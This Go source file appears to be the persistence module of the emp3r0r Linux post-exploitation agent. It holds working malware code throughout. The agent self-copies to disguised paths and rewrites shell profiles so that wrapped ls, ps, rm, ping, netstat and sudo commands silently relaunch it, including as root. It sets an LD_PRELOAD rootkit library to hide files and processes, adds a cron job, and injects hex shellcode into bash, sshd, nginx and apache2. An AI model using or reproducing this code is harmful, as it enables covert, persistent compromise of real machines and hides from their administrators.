package agent

import (
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"os/user"
	"strings"
)

// TODO implement more methods

var (
	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
	PersistMethods = map[string]func() error{
		"ld_preload": ldPreload,
		"profiles":   profiles,
		"service":    service,
		"injector":   injector,
		"cron":       cronJob,
		"patcher":    patcher,
	}

	// EmpLocations all possible locations
	EmpLocations = []string{
		// root
		"/env",
		"/usr/bin/.env",
		"/usr/local/bin/env",
		"/bin/.env",
		"/usr/share/man/man1/arch.gz",
		"/usr/share/man/man1/ls.1.gz",
		"/usr/share/man/man1/arch.5.gz",

		// no root required
		"/tmp/.env",
		"/dev/shm/.env",
		fmt.Sprintf("%s/.wget-hst",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.less-hist",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.sudo_as_admin_successful",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.env",
			os.Getenv("HOME")),
		fmt.Sprintf("%s/.pam",
			os.Getenv("HOME")),
	}

	// call this to start emp3r0r
	payload = strings.Join(EmpLocations, " -silent=true -daemon=true || ") + " -silent=true -daemon=true"
)

// SelfCopy copy emp3r0r to multiple locations
func SelfCopy() {
	for _, path := range EmpLocations {
		err := Copy(os.Args[0], path)
		if err != nil {
			log.Print(err)
			continue
		}
	}
}

// PersistAllInOne run all persistence method at once
func PersistAllInOne() (err error) {
	for k, method := range PersistMethods {
		e := fmt.Errorf("%s: %v", k, method())
		if e != nil {
			err = fmt.Errorf("%v, %v", err, e)
		}
	}
	return
}

func cronJob() (err error) {
	err = Copy(os.Args[0], "bash")
	if err != nil {
		return
	}

	pwd, err := os.Getwd()
	if err != nil {
		return
	}
	err = AddCronJob("*/5 * * * * " + pwd + "/bash")
	return
}

func profiles() (err error) {
	user, err := user.Current()
	if err != nil {
		return fmt.Errorf("Cannot get user profile: %v", err)
	}
	accountInfo, err := CheckAccount(user.Name)
	if err != nil {
		return fmt.Errorf("Cannot check account info: %v", err)
	}

	// source
	sourceCmd := "source ~/.bashprofile"

	// set +m to silent job control
	payload = "set +m;" + payload

	// nologin users cannot do shit here
	if strings.Contains(accountInfo["shell"], "nologin") ||
		strings.Contains(accountInfo["shell"], "false") {
		if user.Uid != "0" {
			return errors.New("This user cannot login")
		}
	}

	// loader
	loader := fmt.Sprintf("\nfunction ls() { (set +m;(%s);); `which ls` $@ --color=auto; }", payload)
	loader += "\nunalias ls" // TODO check if alias exists before unalias it
	loader += "\nunalias rm"
	loader += "\nunalias ps"
	loader += fmt.Sprintf("\nfunction ping() { (set +m;(%s)); `which ping` $@; }", payload)
	loader += fmt.Sprintf("\nfunction netstat() { (set +m;(%s)); `which netstat` $@; }", payload)
	loader += fmt.Sprintf("\nfunction ps() { (set +m;(%s)); `which ps` $@; }", payload)
	loader += fmt.Sprintf("\nfunction rm() { (set +m;(%s)); `which rm` $@; }\n", payload)

	// exec our payload as root too!
	// sudo payload
	var sudoLocs []string
	for _, loc := range EmpLocations {
		sudoLocs = append(sudoLocs, "`which sudo` -E "+loc+" -silent=true -daemon=true")
	}
	sudoPayload := strings.Join(sudoLocs, "||")
	loader += fmt.Sprintf("\nfunction sudo() { `which sudo` $@; (set +m;(%s)) }", sudoPayload)
	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
	if err != nil {
		if !IsFileExist(user.HomeDir) {
			err = ioutil.WriteFile("/etc/bash_profile", []byte(loader), 0644)
			if err != nil {
				return fmt.Errorf("No HomeDir found, and cannot write elsewhere: %v", err)
			}
			err = AppendToFile("/etc/profile", "source /etc/bash_profile")
			return fmt.Errorf("This user has no home dir: %v", err)
		}
		return
	}

	// check if profiles are already written
	data, err := ioutil.ReadFile(user.HomeDir + "/.bashrc")
	if err != nil {
		log.Println(err)
		return
	}
	if strings.Contains(string(data), sourceCmd) {
		err = errors.New("profiles: already written")
		return
	}
	// infect all profiles
	_ = AppendToFile(user.HomeDir+"/.profile", sourceCmd)
	_ = AppendToFile(user.HomeDir+"/.bashrc", sourceCmd)
	_ = AppendToFile(user.HomeDir+"/.zshrc", sourceCmd)
	_ = AppendToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")

	return
}

// add libemp3r0r.so to LD_PRELOAD
// our files and processes will be hidden from common system utilities
func ldPreload() error {
	if !IsFileExist(Libemp3r0rFile) {
		return fmt.Errorf("%s does not exist! Try module vaccine?", Libemp3r0rFile)
	}
	if os.Geteuid() == 0 {
		return ioutil.WriteFile("/etc/ld.so.preload", []byte(Libemp3r0rFile), 0600)
	}

	// if no root, we will just add libemp3r0r.so to bash profile
	u, err := user.Current()
	if err != nil {
		log.Print(err)
		return err
	}
	return AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+Libemp3r0rFile)
}

// AddCronJob add a cron job without terminal
// this creates a cron job for whoever runs the function
func AddCronJob(job string) error {
	cmdStr := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", job)
	cmd := exec.Command("/bin/sh", "-c", cmdStr)
	return cmd.Start()
}

// Inject shellcode into a running process, the shellcode will make sure emp3r0r is alive
// TODO choose a process to inject into
func injector() (err error) {
	// this shellcode forks a process and executes emp3r0r agent
	// https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/guardian.asm
	err = Copy(os.Args[0], "/tmp/e")
	if err != nil {
		return
	}
	shellcode := `\x48\x31\xc0\x48\x31\xff\xb0\x39\x0f\x05\x48\x83\xf8\x00\x7f\x5e\x48\x31\xc0\x48\x31\xff\xb0\x39\x0f\x05\x48\x83\xf8\x00\x74\x2c\x48\x31\xff\x48\x89\xc7\x48\x31\xf6\x48\x31\xd2\x4d\x31\xd2\x48\x31\xc0\xb0\x3d\x0f\x05\x48\x31\xc0\xb0\x23\x6a\x0a\x6a\x14\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe2\xc4\x48\x31\xd2\x52\x48\x31\xc0\x48\xbf\x2f\x2f\x74\x6d\x70\x2f\x2f\x65\x57\x54\x5f\x48\x89\xe7\x52\x57\x48\x89\xe6\x6a\x3b\x58\x99\x0f\x05\xcd\x03`

	// find some processes to inject
	procs := PidOf("bash")
	procs = append(procs, PidOf("sh")...)
	procs = append(procs, PidOf("sshd")...)
	procs = append(procs, PidOf("nginx")...)
	procs = append(procs, PidOf("apache2")...)

	// inject to all of them
	for _, pid := range procs {
		go func(pid int) {
			if pid == 0 {
				return
			}
			log.Printf("Injecting to %s (%d)...", ProcCmdline(pid), pid)
			e := Injector(&shellcode, pid)
			if e != nil {
				err = fmt.Errorf("%v, %v", err, e)
			}
		}(pid)
	}
	if err != nil {
		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, Injector(&shellcode, 0))
	}

	return
}

func service() (err error) {
	return
}

func patcher() (err error) {
	return
}
